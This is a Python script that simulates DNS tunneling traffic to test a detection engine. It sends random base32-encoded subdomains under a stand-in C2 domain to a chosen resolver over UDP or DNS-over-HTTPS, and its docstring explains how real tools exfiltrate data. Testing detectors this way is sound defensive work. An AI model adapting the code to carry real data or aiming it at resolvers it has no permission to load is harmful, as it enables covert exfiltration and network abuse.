#!/usr/bin/env python3
"""
DNS Tunneling Attacker Simulator
=================================
Generates realistic DNS tunneling traffic for testing threat-detection systems.

What real tunneling looks like (and what this mimics):
  - A payload (file chunk, command output, beacon data) is base32-encoded.
  - The encoded blob is split into label-sized chunks (DNS labels max 63 chars).
  - Each chunk becomes a subdomain of an attacker-controlled domain:
        <chunk1>.<chunk2>.<sessionid>.evil.example.
  - The resolver forwards queries to the attacker's authoritative NS, which
    decodes the labels and (optionally) replies with encoded data in TXT/A
    records to send commands back.
  - Tools that do this: iodine, dnscat2, DNSExfiltrator, Cobalt Strike's DNS
    beacon. They produce HIGH-ENTROPY, LONG, FREQUENT, UNIQUE subdomains
    under a single parent domain — exactly the signals your engine detects.

Usage:
    python tunnel_attacker.py --target <resolver-ip> --domain evil.test
    python tunnel_attacker.py --target https://your-resolver/dns-query --doh
    python tunnel_attacker.py --target <ip> --domain evil.test --rate 30 --duration 60
"""

import argparse
import base64
import os
import random
import socket
import string
import struct
import sys
import time
from typing import List


# ----- DNS wire format helpers (no external deps) -----

def build_dns_query(qname: str, qtype: int = 1, qid: int = None) -> bytes:
    """Build a minimal DNS query packet for the given name."""
    if qid is None:
        qid = random.randint(0, 0xFFFF)
    # Header: id, flags=0x0100 (standard query, RD=1), qd=1, an=ns=ar=0
    header = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)
    # Question: qname as length-prefixed labels, then qtype, qclass=IN
    qname_wire = b""
    for label in qname.rstrip(".").split("."):
        label_bytes = label.encode("ascii")
        if len(label_bytes) > 63:
            raise ValueError(f"label too long: {label}")
        qname_wire += bytes([len(label_bytes)]) + label_bytes
    qname_wire += b"\x00"
    question = qname_wire + struct.pack(">HH", qtype, 1)
    return header + question


# ----- Payload generation -----

def generate_payload_chunk(size_bytes: int = 30) -> str:
    """
    Generate a base32-encoded chunk that looks like real exfil traffic.
    Base32 is the encoding of choice because DNS labels are case-insensitive
    and base32's alphabet (A-Z, 2-7) is a safe subset of label characters.
    """
    raw = os.urandom(size_bytes)
    # base32 without padding (= chars aren't valid in DNS labels)
    encoded = base64.b32encode(raw).decode("ascii").rstrip("=").lower()
    return encoded


def craft_tunnel_qname(base_domain: str, session_id: str) -> str:
    """
    Build a tunneling-style FQDN. Real tools layer multiple long, random
    labels under the C2 domain — that's the fingerprint your detector
    keys on (length + entropy + diversity under one parent).
    """
    # 2-3 chunks per query, each near the 63-char label limit
    num_chunks = random.choice([2, 3])
    chunks = [generate_payload_chunk(random.randint(25, 38)) for _ in range(num_chunks)]
    # session id helps the C2 server reassemble streams; we include one too
    return ".".join(chunks) + f".{session_id}.{base_domain}"


# ----- Senders -----

def send_udp(qname: str, resolver_ip: str, port: int = 53, timeout: float = 2.0):
    """Send a single UDP DNS query. We don't care about the response for the demo."""
    pkt = build_dns_query(qname, qtype=random.choice([1, 16]))  # A or TXT
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(pkt, (resolver_ip, port))
        try:
            sock.recvfrom(4096)  # drain reply if any
        except socket.timeout:
            pass
    finally:
        sock.close()


def send_doh(qname: str, doh_url: str, timeout: float = 5.0):
    """Send a DoH (DNS-over-HTTPS) query via POST with the wire-format body."""
    try:
        import requests
    except ImportError:
        print("DoH mode requires the 'requests' library: pip install requests", file=sys.stderr)
        sys.exit(1)
    pkt = build_dns_query(qname, qtype=random.choice([1, 16]))
    headers = {
        "content-type": "application/dns-message",
        "accept": "application/dns-message",
    }
    requests.post(doh_url, data=pkt, headers=headers, timeout=timeout)


# ----- Main loop -----

def run(args):
    session_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    interval = 1.0 / args.rate if args.rate > 0 else 0
    end_time = time.time() + args.duration if args.duration > 0 else float("inf")

    print(f"[*] Tunneling simulator starting")
    print(f"    target:     {args.target} ({'DoH' if args.doh else 'UDP/53'})")
    print(f"    domain:     {args.domain}")
    print(f"    session:    {session_id}")
    print(f"    rate:       {args.rate} qps")
    print(f"    duration:   {'unlimited' if args.duration <= 0 else f'{args.duration}s'}")
    print(f"[*] Ctrl+C to stop\n")

    sent = 0
    errors = 0
    start = time.time()
    try:
        while time.time() < end_time:
            qname = craft_tunnel_qname(args.domain, session_id)
            try:
                if args.doh:
                    send_doh(qname, args.target)
                else:
                    send_udp(qname, args.target)
                sent += 1
                if sent % 20 == 0 or args.verbose:
                    elapsed = time.time() - start
                    print(f"[+] sent={sent} errs={errors} elapsed={elapsed:.1f}s "
                          f"last={qname[:80]}{'...' if len(qname) > 80 else ''}")
            except Exception as e:
                errors += 1
                if args.verbose:
                    print(f"[!] error: {e}", file=sys.stderr)
            if interval:
                time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] interrupted")
    finally:
        elapsed = time.time() - start
        print(f"\n[*] done: {sent} queries in {elapsed:.1f}s "
              f"({sent/max(elapsed,0.001):.1f} qps), {errors} errors")


def main():
    p = argparse.ArgumentParser(description="DNS tunneling traffic simulator (for testing your own detector).")
    p.add_argument("--target", required=True,
                   help="Resolver IP (UDP) or full DoH URL like https://x/dns-query")
    p.add_argument("--domain", default="evil.test",
                   help="Fake C2 parent domain (default: evil.test)")
    p.add_argument("--doh", action="store_true",
                   help="Send via DNS-over-HTTPS instead of UDP/53")
    p.add_argument("--rate", type=float, default=20.0,
                   help="Queries per second (default: 20)")
    p.add_argument("--duration", type=float, default=30.0,
                   help="Seconds to run; 0 = forever (default: 30)")
    p.add_argument("--verbose", "-v", action="store_true")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()